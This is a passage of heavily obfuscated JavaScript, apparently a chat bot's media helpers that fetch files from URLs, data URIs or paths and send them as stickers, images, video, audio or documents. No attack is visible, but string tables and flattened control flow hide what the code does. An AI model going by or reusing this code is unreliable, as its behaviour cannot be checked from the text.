P_cw5z[hBWYC7l>0xec?hBWYC7l+0x7:hBWYC7l<0xec?hBWYC7l>0xec?hBWYC7l+0x4b:hBWYC7l>0xec?hBWYC7l+0x8:hBWYC7l<0x3a?hBWYC7l+0x9:hBWYC7l>0x3a?hBWYC7l<0x3a?hBWYC7l-0x30:hBWYC7l-0x3b:hBWYC7l-0x55:hBWYC7l-0x13]},0x1);void(hBWYC7l[HNhGboO(-0x22)]=0x1,hBWYC7l[XhKj1P(0x70)]=hBWYC7l[XhKj1P(0x3d)]);return hBWYC7l[0x5e]=XkSB43+(XkSB43=hBWYC7l[HNhGboO(-0x1)],0x0),hBWYC7l[0x5e]}typeof(XkSB43=XkSB43,conn[b5HnBX5(HNhGboO(-0x1c))]=Pvyd5E7(async(...hBWYC7l)=>{var XhKj1P=o4SeuCt(hBWYC7l=>{return P_cw5z[hBWYC7l>-0x5c?hBWYC7l<-0x5c?hBWYC7l-0x5b:hBWYC7l>0x56?hBWYC7l-0x23:hBWYC7l>-0x5c?hBWYC7l<0x56?hBWYC7l<-0x5c?hBWYC7l-0x4f:hBWYC7l+0x5b:hBWYC7l+0x64:hBWYC7l-0x11:hBWYC7l+0x42]},0x1);!(hBWYC7l[HNhGboO(-0x22)]=HNhGboO(-0x35),hBWYC7l[0x87]=HNhGboO(-0x2d),hBWYC7l[0x2]=b5HnBX5(XhKj1P(0x2a)),hBWYC7l[HNhGboO(0x12)]={[RTujYc(XhKj1P(-0x25))]:b5HnBX5(HNhGboO(0x1))},hBWYC7l[0x4]=b5HnBX5(XhKj1P(-0x54)),hBWYC7l.qFFIANN=[b5HnBX5[RTujYc(0xa6)](HNhGboO(-0x12),HNhGboO(-0x2a)),b5HnBX5(hBWYC7l[0x87]+XhKj1P(-0x55))],hBWYC7l[XhKj1P(-0x20)]=HNhGboO(-0x12),hBWYC7l[0x7]=void 0x0,hBWYC7l[hBWYC7l[XhKj1P(-0x38)]+HNhGboO(-0x32)]=xeQO3t(XhKj1P(-0x23))[hBWYC7l[XhKj1P(-0x1b)][HNhGboO(-0x34)]](hBWYC7l[0x0])?hBWYC7l[hBWYC7l[XhKj1P(-0x38)]-HNhGboO(-0x2d)]:/^data:.*?\/.*?;base64,/i[b5HnBX5(0xe)](hBWYC7l[XhKj1P(-0x59)])?xeQO3t(HNhGboO(0x2))[b5HnBX5(hBWYC7l[HNhGboO(-0x13)]+HNhGboO(-0x2c))](hBWYC7l[XhKj1P(-0x59)][b5HnBX5(XhKj1P(-0x55))]`,`[0x1],b5HnBX5(XhKj1P(-0x22))):/^https?:\/\//[fwCeNqk[HNhGboO(-0x32)]](hBWYC7l[hBWYC7l[hBWYC7l[HNhGboO(-0x13)]+XhKj1P(-0x21)]-(hBWYC7l[XhKj1P(-0x38)]-XhKj1P(-0x59))])?await(hBWYC7l[HNhGboO(0x5)]=await xeQO3t(-0xcb)(hBWYC7l[hBWYC7l[XhKj1P(-0x38)]-HNhGboO(-0x2d)]))[b5HnBX5(HNhGboO(-0x1d))]():xeQO3t(XhKj1P(-0x1d))[b5HnBX5(XhKj1P(-0x2d))+b5HnBX5(XhKj1P(-0x1f))](hBWYC7l[HNhGboO(-0x34)])?(hBWYC7l[hBWYC7l[hBWYC7l[hBWYC7l[hBWYC7l[0x87]+0x80]+XhKj1P(-0x21)]+(hBWYC7l[HNhGboO(-0x13)]+XhKj1P(-0x1e))]-XhKj1P(-0x59)]=hBWYC7l[HNhGboO(-0x34)],xeQO3t(HNhGboO(0x8))[b5HnBX5(hBWYC7l[HNhGboO(-0x13)]+XhKj1P(-0x56))+hBWYC7l[HNhGboO(0x9)]](hBWYC7l[hBWYC7l[XhKj1P(-0x38)]-(hBWYC7l[0x87]-0x0)])):typeof hBWYC7l[HNhGboO(-0x34)]===hBWYC7l[XhKj1P(-0x1b)][hBWYC7l[XhKj1P(-0x38)]-HNhGboO(0xb)]?hBWYC7l[HNhGboO(-0x34)]:xeQO3t(hBWYC7l[XhKj1P(-0x38)]+HNhGboO(0x4d))[b5HnBX5(0x18)](hBWYC7l[XhKj1P(-0x38)]-(hBWYC7l[XhKj1P(-0x38)]-XhKj1P(-0x59))));if(HkdyK5w(xeQO3t(XhKj1P(-0x23))[b5HnBX5(XhKj1P(-0x53))+'\x65\x72'](hBWYC7l[0x8]),mI4WegQ(-(hBWYC7l[0x87]-XhKj1P(-0x1c))))&&Cg1I3Cv.Nakwck7>-HNhGboO(-0x6)){hBWYC7l[HNhGboO(0xd)]=b5HnBX5(0x1d);throw new(xeQO3t(-(hBWYC7l[0x87]+0x152)))(NorqWB+b5HnBX5[RTujYc(0xa6)](HNhGboO(-0x12),HNhGboO(0xc))+OxZVodA[RTujYc(0xa5)]+hBWYC7l[HNhGboO(0xd)])}hBWYC7l[hBWYC7l[hBWYC7l[XhKj1P(-0x38)]+0x80]+HNhGboO(-0x1a)]=await xeQO3t(-HNhGboO(0xe))[b5HnBX5(hBWYC7l[XhKj1P(-0x38)]+HNhGboO(0xf))](hBWYC7l[0x8])||{[b5HnBX5(hBWYC7l[XhKj1P(-0x38)]+XhKj1P(-0x15))]:b5HnBX5(XhKj1P(0x4e))+b5HnBX5(0x21)+b5HnBX5(XhKj1P(-0x50))+b5HnBX5(hBWYC7l[HNhGboO(-0x13)]+XhKj1P(-0x14)),[hBWYC7l[XhKj1P(-0x13)][RTujYc(XhKj1P(-0x25))]]:b5HnBX5(XhKj1P(-0x2f))};if(hBWYC7l[HNhGboO(-0x2c)]&&hBWYC7l[hBWYC7l[HNhGboO(-0x13)]-HNhGboO(0xb)]&&HkdyK5w(hBWYC7l[hBWYC7l[HNhGboO(-0x13)]-(hBWYC7l[XhKj1P(-0x38)]-0x7)],mI4WegQ(-(hBWYC7l[HNhGboO(-0x13)]-HNhGboO(0x9))))){var QSn3xT=o4SeuCt(hBWYC7l=>{return P_cw5z[hBWYC7l>-0x37?hBWYC7l+0x36:hBWYC7l-0x62]},0x1);void(hBWYC7l[XhKj1P(-0x52)]=path[b5HnBX5(QSn3xT(0x54))](xeQO3t(XhKj1P(0x24)),HkdyK5w(b5HnBX5(XhKj1P(0x30))+new(xeQO3t(0x1d9))*HNhGboO(-0x32)+'\u002e',hBWYC7l[HNhGboO(0x13)][fwCeNqk[0x2]],mI4WegQ(-HNhGboO(-0x29)))),await xeQO3t(XhKj1P(-0x1d))[b5HnBX5[RTujYc(QSn3xT(-0x5))](XhKj1P(-0x37),0x28)+'\x65\x73'][hBWYC7l[hBWYC7l[XhKj1P(-0x38)]-(hBWYC7l[0x87]-QSn3xT(-0x35))]+b5HnBX5(QSn3xT(0x14))](hBWYC7l[XhKj1P(-0x52)],hBWYC7l[XhKj1P(-0x51)]))}if(hBWYC7l[hBWYC7l[0x87]+0x80]>HNhGboO(0x15)){return hBWYC7l[-HNhGboO(-0x15)]}else{var tjWYYPd=o4SeuCt(hBWYC7l=>{return P_cw5z[hBWYC7l<0x4d?hBWYC7l-0x46:hBWYC7l-0x4e]},0x1);return{[fwCeNqk[tjWYYPd(0x6a)]]:hBWYC7l[HNhGboO(0x5)],[b5HnBX5[RTujYc(0xa6)](void 0x0,tjWYYPd(0x70))+tjWYYPd(0x9d)]:hBWYC7l[hBWYC7l[XhKj1P(-0x38)]-tjWYYPd(0x50)],...hBWYC7l[XhKj1P(-0x12)],[b5HnBX5[RTujYc(XhKj1P(-0x2a))](XhKj1P(-0x37),tjWYYPd(0xbe))]:hBWYC7l[hBWYC7l[HNhGboO(-0x13)]+HNhGboO(-0x32)]}}},HNhGboO(-0x35)),conn[b5HnBX5[RTujYc(HNhGboO(-0x7))](HNhGboO(-0x12),[0x2e])+'\x6c\x65']=async(hBWYC7l,XhKj1P,QSn3xT='',tjWYYPd='',rgoga7,FyP1zD=HNhGboO(0x18),xXqKKeg={})=>{var SVABiBi,nI97suA,NorqWB;function OxZVodA(hBWYC7l){return P_cw5z[hBWYC7l<0x76?hBWYC7l<0x76?hBWYC7l>0x76?hBWYC7l+0x3b:hBWYC7l<-0x3c?hBWYC7l+0x18:hBWYC7l>-0x3c?hBWYC7l<0x76?hBWYC7l+0x3b:hBWYC7l+0x3d:hBWYC7l-0x33:hBWYC7l-0x48:hBWYC7l-0x19]}typeof(SVABiBi=b5HnBX5(HNhGboO(0x16)),nI97suA=[b5HnBX5(0x32),b5HnBX5(HNhGboO(0x17)),b5HnBX5(OxZVodA(-0x36))],NorqWB=HNhGboO(0x18));let tGa4JkL=await conn[b5HnBX5(OxZVodA(-0x21))](XhKj1P,!0x0),{[b5HnBX5(OxZVodA(-0x2e))]:EZtHIy,[b5HnBX5[RTujYc(HNhGboO(-0x7))](void 0x0,[0x2d])]:jqmblq,[fwCeNqk[HNhGboO(0x9)]+OxZVodA(0x14)]:WcWgvvQ}=tGa4JkL;if(EZtHIy&&EZtHIy[b5HnBX5[RTujYc(HNhGboO(-0x7))](HNhGboO(-0x12),[OxZVodA(0x15)])]!==0xc8||jqmblq[b5HnBX5(OxZVodA(-0x32))]<=0x10000){try{throw{[b5HnBX5(HNhGboO(0x16))]:xeQO3t(HNhGboO(0x4c))[b5HnBX5(OxZVodA(0x16))](jqmblq[nI97suA[0x0]+'\u006e\u0067']())}}catch(e){var xuqNBP=o4SeuCt(hBWYC7l=>{return P_cw5z[hBWYC7l<-0x64?hBWYC7l-0x51:hBWYC7l>-0x64?hBWYC7l>-0x64?hBWYC7l<0x4e?hBWYC7l<-0x64?hBWYC7l-0x27:hBWYC7l+0x63:hBWYC7l+0x28:hBWYC7l+0x3c:hBWYC7l+0x32]},0x1);if(e[b5HnBX5(HNhGboO(0x16))]&&Cg1I3Cv.Nakwck7>-xuqNBP(-0x33)){throw e[SVABiBi]}}}let zjw5TV={[b5HnBX5(0x2c)+OxZVodA(0x14)]:QSn3xT};if(rgoga7&&Cg1I3Cv.XYEtLy()){zjw5TV[b5HnBX5[RTujYc(0xa3)](HNhGboO(-0x12),[HNhGboO(0x65)])]=rgoga7}if(NorqWB&&Cg1I3Cv.Nakwck7>-HNhGboO(-0x6)){var Vdn2j5={[RTujYc(HNhGboO(0x30))]:b5HnBX5(HNhGboO(0x21))};module.exports=async(hBWYC7l=()=>{var hBWYC7l=o4SeuCt(XhKj1P=>{return P_cw5z[XhKj1P<0x72?XhKj1P>-0x40?XhKj1P<0x72?XhKj1P>0x72?XhKj1P+0x17:XhKj1P<-0x40?XhKj1P-0x11:XhKj1P>-0x40?XhKj1P>-0x40?XhKj1P<-0x40?XhKj1P-0x4c:XhKj1P+0x3f:XhKj1P+0x3e:XhKj1P+0x4e:XhKj1P-0x61:XhKj1P-0x4e:XhKj1P-0x11]},0x1);throw new(xeQO3t(-OxZVodA(0x49)))(b5HnBX5[RTujYc(HNhGboO(-0x5))](HNhGboO(-0x12),0x34)+b5HnBX5(0x35)+b5HnBX5(0x36)+b5HnBX5(hBWYC7l(0x13))+'\u0064')})=>{const XhKj1P=new(xeQO3t(-0x29))(xeQO3t(-HNhGboO(0x5c)).argv.slice(OxZVodA(-0x3a)));if(HkdyK5w(XhKj1P.has(b5HnBX5[RTujYc(0xa6)](void 0x0,OxZVodA(0x18))+b5HnBX5[RTujYc(HNhGboO(-0x7))](void 0x0,[0x39])),XkSB43=-OxZVodA(-0x1f))){var QSn3xT=o4SeuCt(hBWYC7l=>{return P_cw5z[hBWYC7l<0x4d?hBWYC7l<-0x65?hBWYC7l+0xa:hBWYC7l<0x4d?hBWYC7l<0x4d?hBWYC7l>-0x65?hBWYC7l>0x4d?hBWYC7l+0x25:hBWYC7l<0x4d?hBWYC7l+0x64:hBWYC7l-0x5d:hBWYC7l-0x24:hBWYC7l+0x3e:hBWYC7l-0x60:hBWYC7l-0x8]},0x1);if(XhKj1P.size!==OxZVodA(-0x37)&&Cg1I3Cv.Nakwck7>-0xb){return QSn3xT(-0x16)}if(HkdyK5w(XhKj1P.has('\x2d\x76'),XkSB43=-OxZVodA(-0x1f))&&Cg1I3Cv.XYEtLy()){return!0x1}}const tjWYYPd=await(async(XhKj1P,QSn3xT)=>{var tjWYYPd,rgoga7,FyP1zD;function xXqKKeg(XhKj1P){return P_cw5z[XhKj1P<0x93?XhKj1P+0x1e:XhKj1P-0xd]}typeof(tjWYYPd=-0x137,rgoga7=0x19f,FyP1zD={[xXqKKeg(0x36)]:-0x157,i:()=>{var XhKj1P=o4SeuCt(QSn3xT=>{return P_cw5z[QSn3xT<-0x58?QSn3xT+0x58:QSn3xT<0x5a?QSn3xT>0x5a?QSn3xT+0x5:QSn3xT>0x5a?QSn3xT-0x4:QSn3xT>-0x58?QSn3xT>-0x58?QSn3xT<0x5a?QSn3xT<-0x58?QSn3xT-0x3c:QSn3xT<-0x58?QSn3xT+0xf:QSn3xT+0x57:QSn3xT+0x1c:QSn3xT+0x50:QSn3xT+0x15:QSn3xT+0x6]},0x1);if(tjWYYPd==-XhKj1P(0x1e)){var QSn3xT=o4SeuCt(XhKj1P=>{return P_cw5z[XhKj1P>0x108?XhKj1P+0x39:XhKj1P-0x57]},0x1);typeof(tjWYYPd+=HNhGboO(0x10),rgoga7+=0xc);return QSn3xT(0xac)}!(tjWYYPd=0x9,tjWYYPd+=tjWYYPd==FyP1zD[OxZVodA(0x19)]?HNhGboO(0x10):'\u0063',rgoga7+=tjWYYPd==-0x13f?-XhKj1P(-0x3c):'\u0065');return HNhGboO(0x1f)},j:o4SeuCt(()=>{return rgoga7-=0x50},0x0),s:HNhGboO(0x20),D:0x1a,[xXqKKeg(0x4a)]:o4SeuCt(()=>{if(tjWYYPd==-OxZVodA(0x45)){var XhKj1P=o4SeuCt(QSn3xT=>{return P_cw5z[QSn3xT>0x106?QSn3xT+0x4e:QSn3xT>0x106?QSn3xT+0x19:QSn3xT<0x54?QSn3xT+0x5e:QSn3xT<0x106?QSn3xT>0x106?QSn3xT-0xa:QSn3xT>0x106?QSn3xT+0x3c:QSn3xT-0x55:QSn3xT-0x49]},0x1);void(tjWYYPd+=FyP1zD[XhKj1P(0xad)],rgoga7+=XhKj1P(0x70));return XhKj1P(0xbe)}void(tjWYYPd=OxZVodA(0x1c),tjWYYPd+=rgoga7-0x154,rgoga7-=xXqKKeg(-0x1a));return'\u0041'},0x0),[HNhGboO(0x22)]:xXqKKeg(-0x14),[OxZVodA(0x28)]:HNhGboO(0x23),[OxZVodA(0x1f)]:-0x14e,[OxZVodA(0x30)]:()=>rgoga7+=tjWYYPd+0xfe,[OxZVodA(0x25)]:o4SeuCt(()=>{return{p:''}},0x0),r:function(XhKj1P=tjWYYPd==FyP1zD.s){if(XhKj1P){return arguments}return rgoga7=HNhGboO(-0x35)},[xXqKKeg(0x41)]:Pvyd5E7(o4SeuCt((...XhKj1P)=>{var QSn3xT=o4SeuCt(XhKj1P=>{return P_cw5z[XhKj1P<0x97?XhKj1P>0x97?XhKj1P+0x17:XhKj1P+0x1a:XhKj1P-0x7]},0x1);typeof(XhKj1P.length=QSn3xT(-0x16),XhKj1P[HNhGboO(0x26)]=xXqKKeg(0x3d));return XhKj1P[QSn3xT(0x42)]>0xa1?XhKj1P[XhKj1P[xXqKKeg(0x3e)]-0xde]:XhKj1P[HNhGboO(-0x34)]-(XhKj1P[XhKj1P[0x6c]+0x12]+0xe9)},0x0),xXqKKeg(-0x1a)),[HNhGboO(0x34)]:Pvyd5E7(o4SeuCt((...XhKj1P)=>{var QSn3xT=o4SeuCt(XhKj1P=>{return P_cw5z[XhKj1P<0x11?XhKj1P-0x8:XhKj1P>0x11?XhKj1P>0x11?XhKj1P-0x12:XhKj1P-0x2a:XhKj1P-0x3d]},0x1);!(XhKj1P[HNhGboO(-0x22)]=0x1,XhKj1P[OxZVodA(0x22)]=0x4a);return XhKj1P[OxZVodA(0x22)]>QSn3xT(0x70)?XhKj1P[0xb3]:XhKj1P[xXqKKeg(-0x1c)]!=0x150&&(XhKj1P[HNhGboO(-0x34)]!=0x1ab&&XhKj1P[OxZVodA(-0x39)]-(XhKj1P[OxZVodA(0x22)]+0xf5))},0x0),OxZVodA(-0x37))});while(tjWYYPd+rgoga7!=0x17){var SVABiBi;function NorqWB(XhKj1P){return P_cw5z[XhKj1P<0x3f?XhKj1P-0x34:XhKj1P<0xf1?XhKj1P>0xf1?XhKj1P+0x5b:XhKj1P>0xf1?XhKj1P+0x1d:XhKj1P>0x3f?XhKj1P>0xf1?XhKj1P+0x21:XhKj1P<0x3f?XhKj1P+0x2f:XhKj1P-0x40:XhKj1P+0x5e:XhKj1P-0x7]}switch(tjWYYPd+rgoga7){case FyP1zD[HNhGboO(0x29)](rgoga7):SVABiBi=FyP1zD[NorqWB(0xa0)]();if(SVABiBi===xXqKKeg(0x43)){break}else{var tGa4JkL=o4SeuCt(XhKj1P=>{return P_cw5z[XhKj1P>0x100?XhKj1P-0x45:XhKj1P>0x100?XhKj1P-0x54:XhKj1P-0x4f]},0x1);if(typeof SVABiBi==b5HnBX5(tGa4JkL(0xfe))){return SVABiBi.p}}case HNhGboO(0x26):case 0xc3:typeof(rgoga7=-xXqKKeg(0x44),tjWYYPd+=0x7);break;case OxZVodA(0x5b):void(FyP1zD.r(),tjWYYPd*=rgoga7-0x1a9,tjWYYPd-=FyP1zD[xXqKKeg(0x3c)]==-0x14e?-0x139:'\x77',rgoga7+=FyP1zD[NorqWB(0xa3)]<tjWYYPd?-0x27:-OxZVodA(-0x21));break;default:case 0x3e1:if(XhKj1P){return b5HnBX5[RTujYc(0xa6)](NorqWB(0x64),OxZVodA(0x29))+nI97suA[HNhGboO(-0x32)]+'\u0029'}FyP1zD.j();break;case 0x48:case HNhGboO(0x2f):case 0x272:if(FyP1zD.i()==HNhGboO(0x1f)){break}case HNhGboO(0x10):if(QSn3xT===await(FyP1zD.k=hBWYC7l)()){return Vdn2j5[RTujYc(NorqWB(0xa6))]+'\u006c\u0029'}tjWYYPd-=xXqKKeg(-0x4);break;case 0x391:case HNhGboO(0x3):case 0x3db:case NorqWB(0xa7):if(FyP1zD[OxZVodA(0x2d)]()==NorqWB(0xa9)){break}case FyP1zD[HNhGboO(0x34)](rgoga7):if(tjWYYPd==rgoga7-0x136){rgoga7+=FyP1zD.D;break}!(tjWYYPd=0x9,FyP1zD[OxZVodA(0x30)]())}}})();return OxZVodA(0x31)}}if(HkdyK5w(tGa4JkL,XkSB43=-OxZVodA(-0x1f))&&Cg1I3Cv.RJ8fzYI()){if(xXqKKeg[b5HnBX5(HNhGboO(0x37))+b5HnBX5(HNhGboO(-0x1f))]&&Cg1I3Cv.RJ8fzYI()){xXqKKeg[b5HnBX5(HNhGboO(0x38))]=!0x0}}let XMq5nJV='',mI4WegQ=tGa4JkL.mime;if(/webp/[nI97suA[OxZVodA(-0x3a)]](tGa4JkL[b5HnBX5(OxZVodA(-0x25))])&&Cg1I3Cv.Nakwck7>-OxZVodA(-0xb)){var hgnanI=o4SeuCt(hBWYC7l=>{return P_cw5z[hBWYC7l>0xb3?hBWYC7l+0x2:hBWYC7l>0xb3?hBWYC7l+0x3b:hBWYC7l<0xb3?hBWYC7l<0x1?hBWYC7l-0x20:hBWYC7l<0x1?hBWYC7l+0x4c:hBWYC7l>0xb3?hBWYC7l+0x43:hBWYC7l>0xb3?hBWYC7l+0x2:hBWYC7l-0x2:hBWYC7l+0x7]},0x1);XMq5nJV=b5HnBX5[RTujYc(hgnanI(0x33))](void 0x0,HNhGboO(-0x23))}else{var vPbuaQ=[b5HnBX5(HNhGboO(-0x19)),b5HnBX5(0x47)];if(/image/[b5HnBX5[RTujYc(0xa3)](HNhGboO(-0x12),[HNhGboO(-0x31)])](tGa4JkL[b5HnBX5(0x1f)])&&Cg1I3Cv.XYEtLy()){XMq5nJV=b5HnBX5(0x42)}else{var sl6u6L=[b5HnBX5(OxZVodA(-0x25))];if(/video/[b5HnBX5(0xe)](tGa4JkL[sl6u6L[OxZVodA(-0x39)]])&&Cg1I3Cv.Nakwck7>-0xb){var NK6FSu=o4SeuCt(hBWYC7l=>{return P_cw5z[hBWYC7l<-0x50?hBWYC7l+0x8:hBWYC7l>-0x50?hBWYC7l<0x62?hBWYC7l<-0x50?hBWYC7l-0x47:hBWYC7l>-0x50?hBWYC7l<-0x50?hBWYC7l+0x4c:hBWYC7l<-0x50?hBWYC7l-0x3a:hBWYC7l>-0x50?hBWYC7l>-0x50?hBWYC7l+0x4f:hBWYC7l+0x7:hBWYC7l+0x57:hBWYC7l-0x44:hBWYC7l+0x23:hBWYC7l+0x20]},0x1);XMq5nJV=b5HnBX5(NK6FSu(0x20))}else{var Gi4WytK;function AeTs_J(hBWYC7l){return P_cw5z[hBWYC7l>-0x56?hBWYC7l<-0x56?hBWYC7l-0x8:hBWYC7l>0x5c?hBWYC7l-0x6:hBWYC7l>-0x56?hBWYC7l>0x5c?hBWYC7l-0x4f:hBWYC7l<0x5c?hBWYC7l+0x55:hBWYC7l-0x2:hBWYC7l+0x16:hBWYC7l-0x27]}Gi4WytK=b5HnBX5(OxZVodA(-0x19));if(/audio/[b5HnBX5(AeTs_J(-0x50))](tGa4JkL[b5HnBX5(AeTs_J(-0x3f))])&&Cg1I3Cv.htJmLHi>-OxZVodA(0x4)){var yP2DIkb=o4SeuCt(hBWYC7l=>{return P_cw5z[hBWYC7l>-0x5e?hBWYC7l>0x54?hBWYC7l-0x3c:hBWYC7l<0x54?hBWYC7l<0x54?hBWYC7l+0x5d:hBWYC7l+0x27:hBWYC7l+0x61:hBWYC7l+0x59]},0x1);void(convert=await(FyP1zD?xeQO3t(-0x187):xeQO3t(-0x176))(jqmblq,tGa4JkL[b5HnBX5(AeTs_J(-0x1e))]),jqmblq=convert[b5HnBX5(OxZVodA(0x35))],WcWgvvQ=convert[Gi4WytK+'\x6d\x65'],XMq5nJV=b5HnBX5[RTujYc(AeTs_J(-0x26))](void 0x0,[AeTs_J(0x4c)]),mI4WegQ=vPbuaQ[AeTs_J(-0x53)]+b5HnBX5(HNhGboO(-0x28))+vPbuaQ[AeTs_J(-0x51)]+b5HnBX5[RTujYc(0xa3)](void 0x0,[yP2DIkb(-0x32)]))}else{XMq5nJV=b5HnBX5(0x49)+'\x6e\x74'}}}}return await conn[b5HnBX5(OxZVodA(-0xe))+b5HnBX5(HNhGboO(0x3b))](hBWYC7l,{...xXqKKeg,[b5HnBX5(OxZVodA(0x37))]:tjWYYPd,[zVzFKN6]:FyP1zD,[XMq5nJV]:{[b5HnBX5(0x4e)]:WcWgvvQ},[b5HnBX5[RTujYc(OxZVodA(-0xa))](OxZVodA(-0x17),OxZVodA(-0x20))+OxZVodA(0x43)]:mI4WegQ},{...zjw5TV,...xXqKKeg})},Pvyd5E7(xeQO3t,0x1));function xeQO3t(...hBWYC7l){var XhKj1P=o4SeuCt(hBWYC7l=>{return P_cw5z[hBWYC7l>0x7?hBWYC7l<0xb9?hBWYC7l>0xb9?hBWYC7l+0x63:hBWYC7l<0x7?hBWYC7l+0x3e:hBWYC7l<0xb9?hBWYC7l>0x7?hBWYC7l<0x7?hBWYC7l-0x51:hBWYC7l<0xb9?hBWYC7l<0x7?hBWYC7l+0xb:hBWYC7l-0x8:hBWYC7l+0x58:hBWYC7l+0x50:hBWYC7l-0x4a:hBWYC7l-0x3d:hBWYC7l+0x55]},0x1);void(hBWYC7l[XhKj1P(0x1c)]=HNhGboO(-0x32),hBWYC7l[HNhGboO(0x3d)]=HNhGboO(0x17),hBWYC7l[XhKj1P(0xc)]=[b5HnBX5[RTujYc(HNhGboO(-0x7))](HNhGboO(-0x12),[HNhGboO(0xe)]),b5HnBX5(hBWYC7l[HNhGboO(0x3d)]+(hBWYC7l[XhKj1P(0x7b)]+XhKj1P(0xf)))],hBWYC7l[XhKj1P(0x9)]=b5HnBX5(XhKj1P(0x94)),hBWYC7l.HHr9Of9=-0x8a,hBWYC7l.Y5M9fV={[RTujYc(hBWYC7l[XhKj1P(0x7b)]+XhKj1P(0x7c))]:b5HnBX5(HNhGboO(0x3f)),[RTujYc(HNhGboO(0x5f))]:b5HnBX5[RTujYc(0xa6)](XhKj1P(0x2c),XhKj1P(0x7e)),[RTujYc(HNhGboO(0x41))]:b5HnBX5(XhKj1P(0x80))},hBWYC7l.SYSj_DB=hBWYC7l[XhKj1P(0xa)],hBWYC7l[HNhGboO(0x44)]=HNhGboO(-0x12));switch(hBWYC7l.SYSj_DB){case!(Cg1I3Cv.htJmLHi>-0x4)?-0x45:XhKj1P(0x40):return zjw5TV[b5HnBX5(XhKj1P(0x17))]||Vdn2j5[b5HnBX5[RTujYc(0xa3)](void 0x0,[HNhGboO(-0x27)])];case Cg1I3Cv.htJmLHi>-XhKj1P(0x47)?-0xcb:null:hBWYC7l.T9yyZHZ=b5HnBX5(HNhGboO(0x43))||Vdn2j5[b5HnBX5[RTujYc(0xa3)](void 0x0,[XhKj1P(0x81)])];break;case Cg1I3Cv.DS4BLt()?XhKj1P(0x46):-XhKj1P(0x5e):hBWYC7l[XhKj1P(0x82)]='\x66\x73'||Vdn2j5.fs;break;case!Cg1I3Cv.DS4BLt()?XhKj1P(0x2c):-0x159:return zjw5TV[b5HnBX5(HNhGboO(0x45))]||Vdn2j5[b5HnBX5(XhKj1P(0x18))+b5HnBX5(HNhGboO(0x46))];case!Cg1I3Cv.RJ8fzYI()?null:-HNhGboO(0xe):hBWYC7l[HNhGboO(0x44)]=b5HnBX5[RTujYc(XhKj1P(0x37))](HNhGboO(-0x12),[XhKj1P(0x85)])+HNhGboO(0x48)||Vdn2j5[b5HnBX5[RTujYc(XhKj1P(0x39))](HNhGboO(-0x12),0x55)+XhKj1P(0x86)];break;case!Cg1I3Cv.RJ8fzYI()?HNhGboO(-0x23):XhKj1P(0x87):hBWYC7l.T9yyZHZ=b5HnBX5(HNhGboO(0x4a))+b5HnBX5(0x57)||Vdn2j5[b5HnBX5[RTujYc(hBWYC7l[HNhGboO(0x51)]+0x130)](HNhGboO(-0x12),0x56)+b5HnBX5(XhKj1P(0x32))];break;case!(Cg1I3Cv.htJmLHi>-HNhGboO(0x9))?-0x33:hBWYC7l[XhKj1P(0x7b)]-(hBWYC7l.Uc7gzQ-0x1d9):return zjw5TV[b5HnBX5(XhKj1P(0x89))]||Vdn2j5[b5HnBX5(XhKj1P(0x89))];case!Cg1I3Cv.XYEtLy()?-XhKj1P(0x1e):HNhGboO(0x4c):hBWYC7l.T9yyZHZ=b5HnBX5(0x59)||Vdn2j5[b5HnBX5(XhKj1P(0x8b))];break;case Cg1I3Cv.DS4BLt()?-XhKj1P(0x8c):void 0x0:return zjw5TV[b5HnBX5[RTujYc(0xa3)](HNhGboO(-0x12),[XhKj1P(0x63)])]||Vdn2j5[b5HnBX5[RTujYc(HNhGboO(-0x5))](XhKj1P(0x2c),HNhGboO(0x25))];case Cg1I3Cv.XYEtLy()?-HNhGboO(0x4f):XhKj1P(0x2c):return zjw5TV[b5HnBX5(XhKj1P(0x53))]||Vdn2j5[b5HnBX5(XhKj1P(0x53))];case Cg1I3Cv.RJ8fzYI()?-(hBWYC7l[HNhGboO(0x3d)]+XhKj1P(0x59)):null:hBWYC7l[XhKj1P(0x82)]=b5HnBX5[RTujYc(0xa3)](void 0x0,[0x5c])||Vdn2j5[b5HnBX5(XhKj1P(0x8e))];break;case Cg1I3Cv.RJ8fzYI()?-0x187:null:hBWYC7l[HNhGboO(0x44)]=b5HnBX5(hBWYC7l[XhKj1P(0x8f)]+0xe7)||Vdn2j5[b5HnBX5[RTujYc(XhKj1P(0x39))](XhKj1P(0x2c),HNhGboO(0x52))];break;case Cg1I3Cv.U3xqZL5()?-0x176:null:hBWYC7l[HNhGboO(0x44)]=b5HnBX5[RTujYc(0xa3)](HNhGboO(-0x12),[XhKj1P(0x3d)])||Vdn2j5[b5HnBX5(0x5e)];break;case 0x2d9:return zjw5TV[hBWYC7l[XhKj1P(0x9c)][RTujYc(hBWYC7l[HNhGboO(0x51)]+0x135)]]||Vdn2j5[b5HnBX5(XhKj1P(0x7d))];case 0x7d1:return zjw5TV[b5HnBX5(XhKj1P(0x40))]||Vdn2j5[b5HnBX5(HNhGboO(0x2))];case!Cg1I3Cv.RJ8fzYI()?-HNhGboO(-0x25):0x9d5:hBWYC7l.T9yyZHZ=OxZVodA[RTujYc(XhKj1P(0x91))]||Vdn2j5[b5HnBX5(0x61)];break;case 0x1143:hBWYC7l.T9yyZHZ=b5HnBX5(0x62)||Vdn2j5[b5HnBX5(hBWYC7l[HNhGboO(0x3d)]+HNhGboO(0x54))];break;case 0x127a:return zjw5TV[b5HnBX5(hBWYC7l[HNhGboO(0x3d)]+XhKj1P(0x93))+b5HnBX5(0x64)]||Vdn2j5[b5HnBX5(0x63)+b5HnBX5(0x64)];case Cg1I3Cv.ri9obK>-HNhGboO(-0x9)?0xb66:HNhGboO(-0x14):hBWYC7l[XhKj1P(0x82)]=b5HnBX5(XhKj1P(0x7d))+b5HnBX5(HNhGboO(-0x25))||Vdn2j5[b5HnBX5(XhKj1P(0x7d))+b5HnBX5(0x65)];break;case!(Cg1I3Cv.ri9obK>-XhKj1P(0x35))?-XhKj1P(0x35):0x2f9:return zjw5TV[b5HnBX5(XhKj1P(0x94))]||Vdn2j5[hBWYC7l[hBWYC7l[HNhGboO(0x51)]+XhKj1P(0x28)]];case Cg1I3Cv.DS4BLt()?hBWYC7l[XhKj1P(0x7b)]+0x111c:XhKj1P(0x95):return zjw5TV[b5HnBX5(HNhGboO(-0x2))+'\u006e\u0074']||Vdn2j5[b5HnBX5(0x68)];case 0x12dc:hBWYC7l.T9yyZHZ=b5HnBX5(XhKj1P(0x96))+b5HnBX5(HNhGboO(0x59))||Vdn2j5[b5HnBX5(HNhGboO(0x58))+b5HnBX5(HNhGboO(0x59))];break;case 